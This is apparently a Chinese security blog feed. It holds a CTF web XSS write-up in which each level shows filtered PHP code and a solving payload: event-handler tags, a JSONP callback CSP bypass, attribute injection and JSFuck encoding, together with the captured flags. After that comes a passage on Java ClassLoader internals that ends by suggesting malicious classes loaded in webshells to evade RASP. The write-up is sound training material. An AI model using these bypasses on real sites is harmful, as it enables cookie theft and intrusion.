<img src="/2022/03/15/CTF%E7%BB%83%E4%B9%A0-Web%E7%B3%BB%E5%88%97-XSS/image-20220330104451485.png" class title="image-20220330104451485">

<p>题目给出了一些代码，如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$escaped = preg_replace(&quot;/[`&lt;&gt;ux]\\//&quot;, &quot;&quot;,$_GET[&#x27;payload&#x27;]);</span><br><span class="line">?&gt;</span><br><span class="line">//preg_replace()函数匹配替换</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">        window.addEventListener(&quot;load&quot;, function() &#123;</span><br><span class="line">            var name = `&lt;?= $escaped ?&gt;`;</span><br><span class="line">            window.greeting.innerHTML = (name == &#x27;&#x27; ? &#x27;&#x27; : name);</span><br><span class="line">        &#125;);</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line"></span><br><span class="line">    &lt;p id=&quot;greeting&quot;&gt;&lt;/p&gt;</span><br><span class="line"></span><br><span class="line">    &lt;h1&gt;inject&lt;/h1&gt;</span><br><span class="line">    &lt;form&gt;</span><br><span class="line">        &lt;input type=&quot;text&quot; name=&quot;payload&quot; placeholder=&quot;your payload here&quot;&gt;</span><br><span class="line">        &lt;input type=&quot;submit&quot; value=&quot;GO&quot;&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line"></span><br><span class="line">    &lt;h1&gt;src&lt;/h1&gt;</span><br><span class="line">&lt;?php highlight_string(file_get_contents(basename(__FILE__))); ?&gt;</span><br></pre></td></tr></table></figure>

<p>可以看到php将传入的参数进行匹配替换为空 ，正则表达式中的匹配规则将括号中的任意一字符和/字符组成的三元组进行匹配替换</p>
<p><strong>payload</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img/src=1 onerror=alert(document.cookie)&gt;</span><br></pre></td></tr></table></figure>

<img src="/2022/03/15/CTF%E7%BB%83%E4%B9%A0-Web%E7%B3%BB%E5%88%97-XSS/image-20220331164139938.png" class title="image-20220331164139938">



<p>得到flag为: <strong>F1ag{2f4f1079a27234647958d3edba4e7e55}</strong></p>
<h2 id="XSS1"><a href="#XSS1" class="headerlink" title="XSS1"></a>XSS1</h2><p>我们直接来看前端处理代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$escaped = preg_replace(&quot;/&lt;script&gt;/i&quot;, &quot;&quot;, $_GET[&#x27;payload&#x27;]);</span><br><span class="line">?&gt;</span><br><span class="line">    &lt;h1&gt;Hello, &lt;?= $escaped ?&gt;!&lt;/h1&gt;</span><br><span class="line">    &lt;h1&gt;inject&lt;/h1&gt;</span><br><span class="line">    &lt;form&gt;</span><br><span class="line">        &lt;input type=&quot;text&quot; name=&quot;payload&quot; placeholder=&quot;your payload here&quot;&gt;</span><br><span class="line">        &lt;input type=&quot;submit&quot; value=&quot;GO&quot;&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line"></span><br><span class="line">    &lt;h1&gt;src&lt;/h1&gt;</span><br><span class="line">&lt;?php highlight_string(file_get_contents(basename(__FILE__))); ?&gt;</span><br></pre></td></tr></table></figure>

<p>这里的正则匹配是将参数中的<script>这一字符串大小写进行替换为空，过滤掉了<script>这一标签</p>
<p>所以换一个payload进行测试</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;svg/onload=alert(document.cookie)&gt;</span><br></pre></td></tr></table></figure>

<img src="/2022/03/15/CTF%E7%BB%83%E4%B9%A0-Web%E7%B3%BB%E5%88%97-XSS/image-20220330110341629.png" class="" title="image-20220330110341629">

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=1 onerror=alert(document.cookie)&gt;</span><br></pre></td></tr></table></figure>

<img src="/2022/03/15/CTF%E7%BB%83%E4%B9%A0-Web%E7%B3%BB%E5%88%97-XSS/image-20220330110736665.png" class="" title="image-20220330110736665">

<p>得到flag为：<strong>F1ag{9692fd02a92347c6a644eef9d2c53a1}</strong></p>
<h2 id="XSS2"><a href="#XSS2" class="headerlink" title="XSS2"></a>XSS2</h2><p>观察前端源代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&quot;Content-Security-Policy: default-src &#x27;self&#x27;; style-src &#x27;unsafe-inline&#x27;&quot;); ?&gt;</span><br><span class="line"></span><br><span class="line">&lt;script src=&quot;csp01-util.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;script src=&quot;csp01-jsonp.php?callback=callback&quot;&gt;&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;h1&gt;Hello, &lt;?= $_GET[&#x27;payload&#x27;] ?&gt;!&lt;/h1&gt;</span><br><span class="line"></span><br><span class="line">&lt;h1&gt;inject&lt;/h1&gt;</span><br><span class="line">&lt;form&gt;</span><br><span class="line">    &lt;input type=&quot;text&quot; name=&quot;payload&quot; placeholder=&quot;your payload here&quot;&gt;</span><br><span class="line">    &lt;input type=&quot;submit&quot; value=&quot;GO&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line">&lt;h1&gt;src&lt;/h1&gt;</span><br><span class="line">&lt;?php highlight_string(file_get_contents(basename(__FILE__))); ?&gt;</span><br></pre></td></tr></table></figure>

<p>这里通过设置CSP策略来防范XSS，调用js和php文件进行回调</p>
<img src="/2022/03/15/CTF%E7%BB%83%E4%B9%A0-Web%E7%B3%BB%E5%88%97-XSS/image-20220331170011345.png" class="" title="image-20220331170011345">

<img src="/2022/03/15/CTF%E7%BB%83%E4%B9%A0-Web%E7%B3%BB%E5%88%97-XSS/image-20220331170025143.png" class="" title="image-20220331170025143">

<p>上面的js就是定义了callback(money)的js功能，然后php函数执行了callback(3000)</p>
<p>在代码中csp01-jsonp.php调用的是参数为callback函数，我们来看下这串代码的执行情况，将callback设置为test,可以看到直接拼接在(3000)前面。</p>
<img src="/2022/03/15/CTF%E7%BB%83%E4%B9%A0-Web%E7%B3%BB%E5%88%97-XSS/image-20220402135114866.png" class="" title="image-20220402135114866">



<p>我们根据题目中给到的信息构造相应的payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script src=&quot;csp01-jsonp.php?</span><br><span class="line">callback=alert(document.cookie);&quot;&gt;&lt;/script&gt;</span><br><span class="line">//相当于引入了document.cookie;(3000)这一段JS代码</span><br></pre></td></tr></table></figure>

<p>获取flag: <strong>F1ag{257ca1a6de75e4f67258fa461f730664}</strong></p>
<img src="/2022/03/15/CTF%E7%BB%83%E4%B9%A0-Web%E7%B3%BB%E5%88%97-XSS/image-20220402135728563.png" class="" title="image-20220402135728563">



<h2 id="XSS3"><a href="#XSS3" class="headerlink" title="XSS3"></a>XSS3</h2><p>前端代码如下:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$escaped = preg_replace(&quot;/[`()&lt;&gt;&amp;#]/&quot;, &quot;&quot;, $_GET[&#x27;payload&#x27;]);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">    &lt;h1&gt;Hello, &lt;body id=&quot;&lt;?= $escaped ?&gt;&quot;&gt;&lt;?= htmlspecialchars($_GET[&#x27;payload&#x27;]) ?&gt;&lt;/body&gt;!&lt;/h1&gt;</span><br><span class="line"></span><br><span class="line">    &lt;h1&gt;inject&lt;/h1&gt;</span><br><span class="line">    &lt;form&gt;</span><br><span class="line">        &lt;input type=&quot;text&quot; name=&quot;payload&quot; placeholder=&quot;your payload here&quot;&gt;</span><br><span class="line">        &lt;input type=&quot;submit&quot; value=&quot;GO&quot;&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line"></span><br><span class="line">    &lt;h1&gt;src&lt;/h1&gt;</span><br><span class="line">&lt;?php highlight_string(file_get_contents(basename(__FILE__))); ?&gt;</span><br></pre></td></tr></table></figure>

<p>这里的正则匹配是将payload中的`()<>$#进行匹配过滤掉，然后再将html实体编码后的payload输出</p>
<p><strong>payload</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;a=&#x27; onload=javascript:alert(document.cookie) = </span><br></pre></td></tr></table></figure>

<p>得到flag为 <strong>F1ag{cce4052a069b416ebe2259faa81073b8}</strong></p>
<img src="/2022/03/15/CTF%E7%BB%83%E4%B9%A0-Web%E7%B3%BB%E5%88%97-XSS/image-20220402204220116.png" class="" title="image-20220402204220116">

<h2 id="XSS4"><a href="#XSS4" class="headerlink" title="XSS4"></a>XSS4</h2><p>前端代码如下:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$escaped = preg_replace(&quot;/[a-zA-Z0-9]/&quot;, &quot;&quot;, $_GET[&#x27;payload&#x27;]);</span><br><span class="line">?&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">        &lt;?= $escaped ?&gt;</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">    &lt;h1&gt;inject&lt;/h1&gt;</span><br><span class="line">    &lt;form&gt;</span><br><span class="line">        &lt;input type=&quot;text&quot; name=&quot;payload&quot; placeholder=&quot;your payload here&quot;&gt;</span><br><span class="line">        &lt;input type=&quot;submit&quot; value=&quot;GO&quot;&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">    &lt;h1&gt;src&lt;/h1&gt;</span><br><span class="line">&lt;?php highlight_string(file_get_contents(basename(__FILE__))); ?&gt;</span><br></pre></td></tr></table></figure>

<p>这里的正则匹配是将payload中的所有字母以及数字进行匹配过滤，尝试将payloada进行编码处理</p>
<p>后面联想到 JSfunck，使用特定的6种符号来编写代码 ，分别是(、)、+、[、]、！</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">false       =&gt;  ![]</span><br><span class="line">true        =&gt;  !![]</span><br><span class="line">undefined   =&gt;  [][[]]</span><br><span class="line">NaN         =&gt;  +[![]]</span><br><span class="line">0           =&gt;  +[]</span><br><span class="line">1           =&gt;  +!+[]</span><br><span class="line">2           =&gt;  !+[]+!+[]</span><br><span class="line">10          =&gt;  [+!+[]]+[+[]]</span><br><span class="line">Array       =&gt;  []</span><br><span class="line">Number      =&gt;  +[]</span><br><span class="line">String      =&gt;  []+[]</span><br><span class="line">Boolean     =&gt;  ![]</span><br><span class="line">Function    =&gt;  [][&quot;filter&quot;]</span><br><span class="line">eval        =&gt;  [][&quot;filter&quot;][&quot;constructor&quot;]( CODE )()</span><br><span class="line">window      =&gt;  [][&quot;filter&quot;][&quot;constructor&quot;](&quot;return this&quot;)()</span><br></pre></td></tr></table></figure>

<p>我们使用[工具](<a href="http://www.jsfuck.com/">JSFuck - Write any JavaScript with 6 Characters: <a href=""></a>!+</a>)将payload进行编码</p>
<img src="/2022/03/15/CTF%E7%BB%83%E4%B9%A0-Web%E7%B3%BB%E5%88%97-XSS/image-20220402103635656.png" class="" title="image-20220402103635656">

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="linespan><br></pre></td></tr></table></figure>

<p>成功弹窗 </p>
<img src="/2022/03/15/CTF%E7%BB%83%E4%B9%A0-Web%E7%B3%BB%E5%88%97-XSS/image-20220402103716764.png" class="" title="image-20220402103716764">

<p>测试成功，将1修改为documet.cookie</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="linespan><br></pre></td></tr></table></figure>

<p>弹窗获得flag,为<strong>F1ag{0f2a15c7b410bcf8ec6698cbd27fa453}</strong></p>
<img src="/2022/03/15/CTF%E7%BB%83%E4%B9%A0-Web%E7%B3%BB%E5%88%97-XSS/image-20220402103858183.png" class="" title="image-20220402103858183">

<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.jianshu.com/p/f1de775bc43e">CSP策略及绕过方法 - 简书 (jianshu.com)</a></p>
<p><a href="https://www.jianshu.com/p/e7246218f424">Jsfuck -- 一个很有意思的Javascript特性 - 简书 (jianshu.com)</a></p>
<p><a href="https://blog.csdn.net/qq_36539075/article/details/79946099">(67条消息) JSfuck原理解析一——基础原理_直接开车的博客-CSDN博客_jsfuck</a></p>
<p><a href="http://www.jsfuck.com/">JSFuck - Write any JavaScript with 6 Characters: <a href=""></a>!+</a></p>
</script></p>]]></content>
      <categories>
        <category>CTF</category>
        <category>Web</category>
        <category>XSS</category>
      </categories>
      <tags>
        <tag>-CTF -Web -XSS</tag>
      </tags>
  </entry>
  <entry>
    <title>ClassLoader类加载机制</title>
    <url>/2021/12/01/ClassLoader%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/</url>
    <content><![CDATA[<h1 id="ClassLoader类加载机制"><a href="#ClassLoader类加载机制" class="headerlink" title="ClassLoader类加载机制"></a>ClassLoader类加载机制</h1><p>这篇文章算是记录学习代码审计的基础知识，了解java代码中类的加载在JVM中的底层流程。</p>
<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>Java程序执行流程可以分为三部分:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">编写源代码</span><br><span class="line"></span><br><span class="line">编译字节码</span><br><span class="line"></span><br><span class="line">运行java程序</span><br></pre></td></tr></table></figure>



<p><strong>加载过程</strong></p>
<ul>
<li>使用java语法根据程序执行逻辑运算来编写java源代码(.java)</li>
<li>源代码使用编译器javac将其编译成存储着JVM指令的二进制信息的字节码文件(.class)</li>
<li>当调用某个类时，JVM虚拟机会将其放在运行数据区的方法区，在堆区创建一个java.lang.Class对象，用来封装类早方法区内的数据结构。</li>
</ul>
<p>ClassLoader类加载的最终结果是位于堆栈区的java.lang.Class对象，封装类在方法区内的数据结构，还提供了一个访问方法区的数据结构的接口。 </p>
<h2 id="类的生命周期"><a href="#类的生命周期" class="headerlink" title="类的生命周期"></a>类的生命周期</h2><p>类的生命周期经历四个过程: </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">加载--&gt;连接(验证，准备，解析)--&gt;初始化--&gt;结束生命周期</span><br></pre></td></tr></table></figure>

<p>如图所示:</p>
<img src="/2021/12/01/ClassLoader%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/image-20211201113220253.png" class title="image-20211201113220253">







<h3 id="类的加载"><a href="#类的加载" class="headerlink" title="类的加载"></a>类的加载</h3><p>类的加载在上面的概述中已经解释了，就是JVM虚拟机把源代码编译成字节码二进制文件并将其放在java堆中生成一个java.lang.Class类对象。</p>
<h3 id="类的连接"><a href="#类的连接" class="headerlink" title="类的连接"></a>类的连接</h3><p>类的连接分为验证、准备、解析三部分。</p>
<ul>
<li><p>验证:检测加载类的二进制文件字节流安全性，文件字节流包含信息是否符合当前虚拟机要求并且不会危害虚拟机自身安全。</p>
<p>主要分为4个阶段的检验动作:</p>
<ul>
<li>文件格式验证:验证加载类的字节流文件是否符合Class文件的格式规范。</li>
<li>元数据验证:    对字节码文件中描述的信息进行语义分析，检测是否符合java语言规范的要求。</li>
<li>字节码验证:    提供数据流和控制流来分析程序语义是否合法和符合逻辑的。</li>
<li>符号引用验证: 确保解析动作是否能正确执行。</li>
</ul>
</li>
<li><p>准备:为加载类中的静态变量(static修饰的变量)分配内存并将其初始化为默认值.</p>
<p>​         举个栗子:     <strong>Static int test &#x3D; 10</strong></p>
<p>​         在该步骤会将test初始化为默认值0。值得一提的是，10的赋值会在初始化阶段完成。</p>
</li>
<li><p>解析:把类中的符号引用转换成直接引用。直接指向目标的指针、相对偏移量或一个简介定位到目标的句柄。</p>
</li>
</ul>
<h3 id="类的初始化"><a href="#类的初始化" class="headerlink" title="类的初始化"></a>类的初始化</h3><p>这是类加载的最后阶段，为静态变量赋值。若该类具有父类，则先对父类进行初始化。</p>
<p>初始化步骤:</p>
<ul>
<li>这个类没有被加载和连接，程序先加载并连接该类</li>
<li>该类的直接父类还没有被初始化，先初始化其父类</li>
<li>该类中有初始化语句，依次执行初始化语句</li>
</ul>
<h3 id="结束生命周期"><a href="#结束生命周期" class="headerlink" title="结束生命周期"></a>结束生命周期</h3><p>JVM虚拟机结束生命周期，有如下几种情况:</p>
<ul>
<li>执行system.exit()方法</li>
<li>程序正常执行结束</li>
<li>程序在执行过程中遇到了异常或错误导致异常终止</li>
<li>由于操作系统出现错误而导致jvm虚拟机进程终止</li>
</ul>
<h2 id="类加载器"><a href="#类加载器" class="headerlink" title="类加载器"></a>类加载器</h2><p>在 JVM中，类的加载是由类加载器完成的。类加载器可分为JVM自带的类加载器和用户自定义的类加载器。</p>
<ul>
<li>JVM自带的类加载器: 引导类加载器(根类加载器)、扩展类加载器、系统类加载器。</li>
<li>用户自定义的类加载器：java.lang.ClassLoader的子类实例。</li>
</ul>
<h3 id="JVM内置加载器"><a href="#JVM内置加载器" class="headerlink" title="JVM内置加载器"></a>JVM内置加载器</h3><h4 id="根类加载器-Bootstrap-ClassLoader"><a href="#根类加载器-Bootstrap-ClassLoader" class="headerlink" title="根类加载器(Bootstrap ClassLoader)"></a>根类加载器(Bootstrap ClassLoader)</h4><ul>
<li>最底层的类加载器，没有父加载器，也没有继承java.lang.ClassLoader类</li>
<li>加载sun.boot.class.path指定路径下的核心类库(<code>%JAVAHOME%/jre/lib/rt.jar</code>中的文件)</li>
<li>只加载java,javax,sun开头的类</li>
</ul>
<p>Demo代码如下；</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> Classloader_test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Classloader_test1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        ClassLoader classloader = Object.class.getClassLoader();</span><br><span class="line">        System.out.println(classloader); <span class="comment">//根类加载器打印的结果是null</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行结果；</p>
<img src="/2021/12/01/ClassLoader%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/image-20211130151121972.png" class title="image-20211130151121972">





<h4 id="扩展类加载器-Extension-ClassLoader"><a href="#扩展类加载器-Extension-ClassLoader" class="headerlink" title="扩展类加载器(Extension ClassLoader)"></a>扩展类加载器(Extension ClassLoader)</h4><ul>
<li>通常来说，扩展类加载器的父类加载器是根类加载器，其实它只是具备根类加载器的功能。扩展类加载器的父类加载器为null，当loadClass方法中的parent为null时，交由根类加载器来处理。</li>
<li>扩展类加载器主要用于加载<code>%JAVAHOME%/jre/lib/ext</code>目录下的类库或者系统变量<code>java.ext.dirs</code>指定目录下的类库</li>
</ul>
<img src="/2021/12/01/ClassLoader%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/image-20211130152410967.png" class title="image-20211130152410967">

<p>Demo代码:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> Classloader_test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Classloader_test1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        ClassLoader classLoader1 = DNSNameService.class.getClassLoader();</span><br><span class="line">        System.out.print(<span class="string">&quot;DNSNameservice类的加载器为:&quot;</span>+ classLoader1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行结果:</p>
<img src="/2021/12/01/ClassLoader%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/image-20211130153119832.png" class title="image-20211130153119832">

<p>可以看到此时类加载器为扩展类加载器</p>
<h4 id="系统类加载器-App-ClassLoader"><a href="#系统类加载器-App-ClassLoader" class="headerlink" title="系统类加载器(App ClassLoader)"></a>系统类加载器(App ClassLoader)</h4><ul>
<li>默认的类加载器，负责从classpath环境变量或者系统属性java.classs.path所指定的目录中加载类</li>
<li>在不指定类加载器的情况下，默认使用系统类加载器加载类，它的父类是扩展类加载器。通过ClassLoader.getSystemClassLoader()来获得</li>
</ul>
<p>Demo代码如下；</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> Classloader_test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Classloader_test1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        ClassLoader loader = Thread.currentThread().getContextClassLoader();</span><br><span class="line">        System.out.println(<span class="string">&quot;默认类加载器为:&quot;</span>+loader);</span><br><span class="line">            &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>运行结果；</p>
<img src="/2021/12/01/ClassLoader%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/image-20211130153857499.png" class title="image-20211130153857499">



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">注:JVM加载类是按需加载的，只有需要使用该类时才会将它的class文件加载到内存生成class对象。并且加载某个类时，JVM采用双亲委派模式，将加载类的请求交由父加载器处理，是一种任务委派模式。</span><br></pre></td></tr></table></figure>



<h4 id="双亲委派"><a href="#双亲委派" class="headerlink" title="双亲委派"></a>双亲委派</h4><p>除了根类加载器之外，其他的类加载器都需要自己的父加载器。类的加载过程采用双亲委派机制，当类加载器加载一个类时，会先委托自己的父类加载器加载这个类，若父类加载器能够加载则由父类加载器加载，否则由自己加载该类。</p>
<p>如图:</p>
<img src="/2021/12/01/ClassLoader%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/image-20211201113721976.png" class title="image-20211201113721976">



<p>Demo代码:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> Classloader_test;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Classloader_test1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        ClassLoader loader = Thread.currentThread().getContextClassLoader();</span><br><span class="line">        System.out.println(loader);</span><br><span class="line">        System.out.println(loader.getParent());</span><br><span class="line">             System.out.println(loader.getParent().getParent());</span><br><span class="line">    &#125;&#125;</span><br></pre></td></tr></table></figure>

<p>运行结果:</p>
<img src="/2021/12/01/ClassLoader%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/image-20211130163705818.png" class title="image-20211130163705818">





<h3 id="自定义类加载器"><a href="#自定义类加载器" class="headerlink" title="自定义类加载器"></a>自定义类加载器</h3><p>java.lang.ClassLoader是所有的类加载器的父类，所以ClassLoader有许多子类加载器。比如下方的URLClassLoader类加载器，重写了findClass()方法实现加载目录Class文件甚至是加载远程文件造成命令执行等</p>
<p>我们可以自定义类加载器实现加载自定义的字节码(加载恶意文件)触发恶意代码执行。</p>
<p>下面以helloworld.java举例说明:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> Classloader_test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">helloworld</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">hello</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hello World!!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>将该类编译并查看其字节码</p>
<img src="/2021/12/01/ClassLoader%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/image-20211201121810882.png" class title="image-20211201121810882">



<p>一个类可以被JVM内置类加载器加载的前提是存在于classpath中，否则就需要我们自定义类加载器继承ClassLoade类重写findclass方法，传入所需加载类的字节码来向JVM定义一个类，最后通过反射机制调用该类执行代码。</p>
<p>自定义TestClassLoader类:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> Classloader_test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestClassLoader</span> <span class="keyword">extends</span> <span class="title">ClassLoader</span> </span>&#123;</span><br><span class="line">        <span class="comment">// TestHelloWorld类名</span></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">static</span> String testClassName = <span class="string">&quot;Classloader_test.Helloworld&quot;</span>;</span><br><span class="line">        <span class="comment">// TestHelloWorld类字节码</span></span><br><span class="line">        <span class="keyword">byte</span>[] testClassBytes = Files.readAllBytes(Paths.get(<span class="string">&quot;/Users/Administrator/Desktop/Helloworld.class&quot;</span>));<span class="comment">//加载字节码文件</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">TestClassLoader</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> Class&lt;?&gt; findClass(String name) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        <span class="comment">// 只处理TestHelloWorld类</span></span><br><span class="line">        <span class="keyword">if</span> (name.equals(testClassName)) &#123;</span><br><span class="line">        <span class="comment">// 调用JVM的native方法定义TestHelloWorld类</span></span><br><span class="line">        <span class="keyword">return</span> defineClass(testClassName, testClassBytes, <span class="number">0</span>, testClassBytes.length);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">super</span>.findClass(name);</span><br><span class="line">        &#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="comment">// 创建自定义的类加载器</span></span><br><span class="line">        TestClassLoader loader = <span class="keyword">new</span> TestClassLoader();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 使用自定义的类加载器加载TestHelloWorld类</span></span><br><span class="line">        Class testClass = loader.loadClass(testClassName);</span><br><span class="line">        <span class="comment">// 反射创建TestHelloWorld类，等价于 TestHelloWorld t = new TestHelloWorld();</span></span><br><span class="line">        Object testInstance = testClass.newInstance();</span><br><span class="line">        <span class="comment">// 反射获取hello方法</span></span><br><span class="line">        Method method = testInstance.getClass().getMethod(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">        <span class="comment">// 反射调用hello方法,等价于 String str = t.hello();</span></span><br><span class="line">        String str = (String) method.invoke(testInstance);</span><br><span class="line">        System.out.println(str);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>



<p>运行结果:</p>
<img src="/2021/12/01/ClassLoader%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/image-20211201134716275.png" class title="image-20211201134716275">



<p>总结:</p>
<p>根据上方自定义类加载helloworld类调用hello方法来看，我们可以延申一下攻击思路。我们可以在webshell中 实现加载并调用自己编译的类对象(恶意类)来执行恶意操作，比如本地命令执行等。在这一过程中调用自定义类字节码的native方法绕过RASP检测，我们也可以通过一些弱加密来加密java字节码。</p>
<h2 id="ClassLoader"><a href="#ClassLoader" class="headerlink" title="ClassLoader"></a>ClassLoader</h2><p>上面提到的所有类加载器都必须继承java.lang.ClassLoader类。</p>
<p>它的主要方法可以分为5种:</p>
<ul>
<li>loadClass (加载指定的java类)</li>
<li>findClass (查找指定的java类 )</li>
<li>findloadedClass (查看JVM加载过的类)</li>
<li>defineClass (定义一个java类)</li>
<li>resolveClass (链接指定的java类)</li>
</ul>
<h3 id="LoadClass"><a href="#LoadClass" class="headerlink" title="LoadClass"></a>LoadClass</h3><p>在ClassLoader类中存在一个loadClass方法，该代码就是双亲委派的实现。</p>
<p>当父类加载器加载不到类时，会调用findClass方法查找类，使用本身的类加载器进行加载类.</p>
<p>代码如下；</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> Class&lt;?&gt; loadClass(String name, <span class="keyword">boolean</span> resolve)</span><br><span class="line">       <span class="keyword">throws</span> ClassNotFoundException</span><br><span class="line">   &#123;</span><br><span class="line">       <span class="keyword">synchronized</span> (getClassLoadingLock(name)) &#123;</span><br><span class="line">           <span class="comment">// First, check if the class has already been loaded</span></span><br><span class="line">           Class&lt;?&gt; c = findLoadedClass(name);</span><br><span class="line">           <span class="keyword">if</span> (c == <span class="keyword">null</span>) &#123;</span><br><span class="line">               <span class="keyword">long</span> t0 = System.nanoTime();</span><br><span class="line">               <span class="keyword">try</span> &#123;</span><br><span class="line">                   <span class="keyword">if</span> (parent != <span class="keyword">null</span>) &#123;</span><br><span class="line">                       c = parent.loadClass(name, <span class="keyword">false</span>);</span><br><span 